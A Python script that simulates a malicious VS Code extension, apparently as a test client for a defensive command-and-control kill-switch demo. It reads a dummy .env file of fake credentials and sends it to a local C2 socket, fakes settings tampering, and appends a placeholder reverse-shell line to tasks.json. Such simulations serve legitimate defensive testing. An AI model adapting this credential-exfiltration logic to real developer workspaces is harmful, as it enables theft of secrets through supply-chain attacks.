import socket
import json
import time
import threading
import os
import sys

C2_HOST = '127.0.0.1'
C2_PORT = 6060

# Create a simulated VS Code Workspace
WORKSPACE_DIR = "dummy_vscode_workspace"
os.makedirs(WORKSPACE_DIR, exist_ok=True)


def setup_dummy_workspace():
    """Simulates a developer's environment with sensitive artifacts"""
    with open(f"{WORKSPACE_DIR}/.env", "w") as f:
        f.write("AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\nDB_PASS=super_secret_db_pass")

    os.makedirs(f"{WORKSPACE_DIR}/.vscode", exist_ok=True)
    with open(f"{WORKSPACE_DIR}/.vscode/tasks.json", "w") as f:
        f.write('{"version": "2.0.0", "tasks": [{"label": "build"}]}')


def kill_switch_listener(sock):
    """Listens for the 'Self-Destruct' command from the Java C2 Center"""
    try:
        f = sock.makefile('r')
        while True:
            line = f.readline()
            if not line: break
            if "KILL_SWITCH_ENGAGED" in line:
                print("\n[!] CRITICAL: TACTICAL KILL SWITCH RECEIVED FROM C2.")
                print("[!] Self-destructing malicious extension logic...")
                os._exit(0)  # Immediately halt all Python execution
    except:
        pass


def malicious_extension_routine():
    """Simulates the supply chain attack behavior"""
    setup_dummy_workspace()

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((C2_HOST, C2_PORT))
        print("[EXTENSION] Malicious Extension loaded. Connected to external C2.")

        # Start listening for defense actions
        threading.Thread(target=kill_switch_listener, args=(s,), daemon=True).start()

        # Phase 1: Artifact Stealer (.env)
        time.sleep(2)
        print("[STEALER] Accessing .env file...")
        with open(f"{WORKSPACE_DIR}/.env", "r") as f:
            payload = {"type": "EXFILTRATION", "file": ".env", "payload": f.read().strip()}
            s.sendall((json.dumps(payload) + '\n').encode('utf-8'))

        # Phase 2: Settings Tampering
        time.sleep(3)
        print("[TAMPER] Modifying settings.json...")
        payload = {"type": "MODIFICATION", "file": ".vscode/settings.json", "payload": "telemetry.enable=false"}
        s.sendall((json.dumps(payload) + '\n').encode('utf-8'))

        # Phase 3: Task Hijacker
        time.sleep(3)
        print("[HIJACK] Injecting reverse shell into tasks.json...")
        with open(f"{WORKSPACE_DIR}/.vscode/tasks.json", "a") as f:
            f.write("\n// INJECTED: python -c 'import socket...'")
        payload = {"type": "HIJACK", "file": ".vscode/tasks.json", "payload": "injected_reverse_shell_task"}
        s.sendall((json.dumps(payload) + '\n').encode('utf-8'))

        # Keep alive to allow Kill Switch testing
        while True: time.sleep(1)

    except ConnectionRefusedError:
        print("[FATAL] Could not connect to C2. Start Java VortexC2 first!")


if __name__ == "__main__":
    print("--- VORTEX: Malicious VS Code Extension Simulator ---")
    malicious_extension_routine()